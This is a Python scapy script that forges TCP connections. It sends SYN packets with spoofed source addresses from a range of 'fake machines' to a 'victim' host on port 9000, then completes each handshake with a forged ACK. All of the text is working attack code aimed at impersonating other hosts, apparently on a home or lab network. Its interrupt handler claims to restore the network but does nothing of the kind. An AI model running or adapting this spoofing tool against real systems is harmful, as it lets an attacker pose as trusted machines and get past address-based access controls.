import scapy.all as sc;
import sys;
import random; 

def send_synpacket(src_ip, dst_ip, sport, dport):
	print("[+]sending from {}:{} to {}:{}".format(src_ip, sport, dst_ip, dport))
	my_seq = random.randint(100000000, 999999999)
	print(str(my_seq) + ' <<<<<<<<<<')
	ip = sc.IP(src=src_ip, dst=dst_ip)
	tcp = sc.TCP(sport=sport, dport=dport, flags="S", seq=my_seq)
	packet = ip/tcp

	#send and get sequence
	ack = sc.sr1(packet, timeout=10)
	sniffed_seq = ack[sc.TCP].seq if ack else None
	print("[i]generated_seq: {} - sniffed_seq:{}".format(my_seq,sniffed_seq))
	return my_seq, sniffed_seq

def send_ack(src_ip, dst_ip, sport, dport, my_seq, sniffed_seq):
	print("[+] Sending Ack....")
	if sniffed_seq is None:
		print("[-] No sniffed sequence, canceled")
		return
	ip = sc.IP(src=src_ip, dst=dst_ip)
	tcp = sc.TCP(sport=sport, dport=dport, flags="A", seq=my_seq+1, ack=sniffed_seq+1)
	packet = ip/tcp
	sc.send(packet)
	print("[+_/] Finished sending Ack")
	# packet = ip/tcp
	# sc.sr1(packet, timeout=10)


if __name__ == "__main__":
    ip_start = 150 if len(sys.argv) < 2 else int(sys.argv[1])
    ip_end = 155 if len(sys.argv) < 2 else int(sys.argv[2])
    fake_machines = ["192.168.1."+str(i) for i in range(ip_start, ip_end+1)]
    
    # gateway ip address
    host = "192.168.1.1" if len(sys.argv) < 4 else sys.argv[3]
    print("Host ip address is {}".format(host))

    #victim ip address
    victim = "192.168.1.104" if len(sys.argv) < 5 else sys.argv[4]
    print("Victim ip address is {}".format(victim))
    try:
	    # while True:
	    	for fake_machine in fake_machines:
	    		(my_seq, sniffed_seq) = send_synpacket(fake_machine, victim, 54486, 9000)
	    		send_ack(fake_machine, victim, 54486, 9000, my_seq, sniffed_seq)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")  
  